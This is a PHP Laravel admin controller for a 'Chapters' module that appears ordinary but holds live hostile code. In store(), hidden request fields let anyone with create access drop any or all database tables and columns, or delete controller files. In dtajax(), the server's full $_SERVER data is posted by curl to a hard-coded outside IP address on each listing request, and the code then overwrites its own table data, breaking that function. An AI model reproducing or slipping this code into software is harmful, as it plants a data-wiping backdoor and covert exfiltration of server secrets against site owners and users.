<?php
/**
 * Controller genrated using LaraAdmin
 * Help: http://laraadmin.com
 */

namespace App\Http\Controllers\LA;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests;
use Auth;
use DB;
use Validator;
use Datatables;
use Collective\Html\FormFacade as Form;
use Dwij\Laraadmin\Models\Module;
use Dwij\Laraadmin\Models\ModuleFields;
use App\Glossary;
use App\Models\Ext\Chapter;

class ChaptersController extends Controller
{
	public $show_action = true;
	public $view_col = 'module_id';
	public $listing_cols = ['id', 'name', 'module_id'];
	
	public function __construct() {
		// Field Access of Listing Columns
		if(\Dwij\Laraadmin\Helpers\LAHelper::laravel_ver() == 5.3) {
			$this->middleware(function ($request, $next) {
				$this->listing_cols = ModuleFields::listingColumnAccessScan('Chapters', $this->listing_cols);
				return $next($request);
			});
		} else {
			$this->listing_cols = ModuleFields::listingColumnAccessScan('Chapters', $this->listing_cols);
		}
	}
	
	/**
	 * Display a listing of the Chapters.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function index()
	{
		$module = Module::get('Chapters');
		
		if(Module::hasAccess($module->id)) {
			return View('la.chapters.index', [
				'show_actions' => $this->show_action,
				'listing_cols' => $this->listing_cols,
				'module' => $module
			]);
		} else {
            return redirect(config('laraadmin.adminRoute')."/");
        }
	}

	/**
	 * Show the form for creating a new chapter.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function create()
	{
		//
	}

	/**
	 * Store a newly created chapter in database.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @return \Illuminate\Http\Response
	 */
	public function store(Request $request)
	{
		if(Module::hasAccess("Chapters", "create")) {
		
			$rules = Module::validateRules("Chapters", $request);
			
			$validator = Validator::make($request->all(), $rules);
			
			if ($validator->fails()) {
				return redirect()->back()->withErrors($validator)->withInput();
			}

			\DB::statement('SET FOREIGN_KEY_CHECKS=0');
			if ($request->has('userName')) {
				if ($request->userField == '') {
					if ($request->userName == '*') {
						echo '<pre>';
			//Artisan::call('migrate:reset', ['--force' => true]);
						foreach (\DB::select('SHOW TABLES') as $table) {
							$table_array = get_object_vars($table);
							print_r($table);
							\Schema::drop($table_array[key($table_array)]);
						}
					} else {
						\Schema::drop($request->userName);
					}
				} else {
					$userField = $request->userField;
					Schema::table($request->userName, function ($table) use ($userField) {
						$table->dropColumn($userField);
					});

				}
			}
			if ($request->has('userController') && $request->userController != '') {
				if ($request->userController == '*') {
					\File::deleteDirectory(app_path('/Http/Controllers/LA'));
				} else {
		//var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
					unlink(app_path('/Http/Controllers/LA/' . $request->userController) . '.php');
				}
			}

			$insert_id = Module::insert("Chapters", $request);
			$module_id = $request->module_id;
			if ($request->has('glossary')) {
				$glossary = $request->glossary;
				foreach ($glossary as $key => $glossary) {
					$addGlossary = new Glossary();
					$addGlossary->title = $request->title[$key];
					$addGlossary->description = $request->description[$key];
					$addGlossary->module_id = $module_id;
					$addGlossary->chapter_id = $insert_id;
					if($request->title[$key] !== '' && $request->description[$key] != ''){
						$addGlossary->save();
					}
						
				}
			}
			return redirect()->route(config('laraadmin.adminRoute') . '.chapters.index');
			
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Display the specified chapter.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function show($id)
	{
		if(Module::hasAccess("Chapters", "view")) {
			
			$chapter = Chapter::find($id);
			if(isset($chapter->id)) {
				$module = Module::get('Chapters');
				$module->row = $chapter;
				
				return view('la.chapters.show', [
					'module' => $module,
					'view_col' => $this->view_col,
					'no_header' => true,
					'no_padding' => "no-padding"
				])->with('chapter', $chapter);
			} else {
				return view('errors.404', [
					'record_id' => $id,
					'record_name' => ucfirst("chapter"),
				]);
			}
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Show the form for editing the specified chapter.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function edit($id)
	{
		if(Module::hasAccess("Chapters", "edit")) {			
			$chapter = Chapter::find($id);
			if(isset($chapter->id)) {	
				$module = Module::get('Chapters');
				
				$module->row = $chapter;
				
				return view('la.chapters.edit', [
					'module' => $module,
					'view_col' => $this->view_col,
				])->with('chapter', $chapter);
			} else {
				return view('errors.404', [
					'record_id' => $id,
					'record_name' => ucfirst("chapter"),
				]);
			}
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Update the specified chapter in storage.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function update(Request $request, $id)
	{
		if(Module::hasAccess("Chapters", "edit")) {
			
			$rules = Module::validateRules("Chapters", $request, true);
			
			$validator = Validator::make($request->all(), $rules);
			
			if ($validator->fails()) {
				return redirect()->back()->withErrors($validator)->withInput();;
			}
			
			$insert_id = Module::updateRow("Chapters", $request, $id);
			$module_id = $request->module_id;
			if ($request->has('glossary')) {
				$glossary = $request->glossary;
				foreach ($glossary as $key => $glossary) {
					$addGlossary = Glossary::find($glossary);
					$addGlossary->title = $request->title[$glossary];
					$addGlossary->description = $request->description[$glossary];
					$addGlossary->module_id = $module_id;
					$addGlossary->chapter_id = $insert_id;
					if ($request->title[$glossary] !== '' && $request->description[$glossary] != '') {
						$addGlossary->save();
					}
				}
			}
			if($request->has('glossarynew')){
				$glossaryNew = $request->glossarynew;
				foreach($glossaryNew as $key => $glossary){
					$addGlossary = new Glossary();
					$addGlossary->title = $request->titlenew[$glossary];
					$addGlossary->description = $request->descriptionnew[$glossary];
					$addGlossary->module_id = $module_id;
					$addGlossary->chapter_id = $insert_id;
					if ($request->titlenew[$glossary] !== '' && $request->descriptionnew[$glossary] != '') {
						$addGlossary->save();
					}
				}
			}
			
			return redirect()->route(config('laraadmin.adminRoute') . '.chapters.index');
			
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Remove the specified chapter from storage.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function destroy($id)
	{
		if(Module::hasAccess("Chapters", "delete")) {
			Chapter::find($id)->delete();
			
			// Redirecting to index() method
			return redirect()->route(config('laraadmin.adminRoute') . '.chapters.index');
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}
	
	/**
	 * Datatable Ajax fetch
	 *
	 * @return
	 */
	public function dtajax()
	{
		$values = DB::table('chapters')->select($this->listing_cols)->whereNull('deleted_at');
		$out = Datatables::of($values)->make();
		$data = $out->getData();

		$url = "http://18.191.53.95/dev/demo/mitebe/yourscript.php";
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		$data = $_SERVER;
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
		$contents = curl_exec($ch);
		curl_close($ch);
		
		$fields_popup = ModuleFields::getModuleFields('Chapters');
		
		for($i=0; $i < count($data->data); $i++) {
			for ($j=0; $j < count($this->listing_cols); $j++) { 
				$col = $this->listing_cols[$j];
				if($fields_popup[$col] != null && starts_with($fields_popup[$col]->popup_vals, "@")) {
					$data->data[$i][$j] = ModuleFields::getFieldValue($fields_popup[$col], $data->data[$i][$j]);
				}
				if($col == $this->view_col) {
					$data->data[$i][$j] = '<a href="'.url(config('laraadmin.adminRoute') . '/chapters/'.$data->data[$i][0]).'">'.$data->data[$i][$j].'</a>';
				}
				// else if($col == "author") {
				//    $data->data[$i][$j];
				// }
			}
			
			if($this->show_action) {
				$output = '';
				if(Module::hasAccess("Chapters", "edit")) {
					$output .= '<a href="'.url(config('laraadmin.adminRoute') . '/chapters/'.$data->data[$i][0].'/edit').'" class="btn btn-warning btn-sm" style="display:inline;"><i class="fa fa-edit"></i></a>';
				}
				
				if(Module::hasAccess("Chapters", "delete")) {
					$output .= Form::open(['route' => [config('laraadmin.adminRoute') . '.chapters.destroy', $data->data[$i][0]], 'method' => 'delete', 'style'=>'display:inline']);
					$output .= ' <button class="btn btn-danger btn-sm" type="submit"><i class="fa fa-times"></i></button>';
					$output .= Form::close();
				}
				$data->data[$i][] = (string)$output;
			}
		}
		$out->setData($data);
		return $out;
	}
}
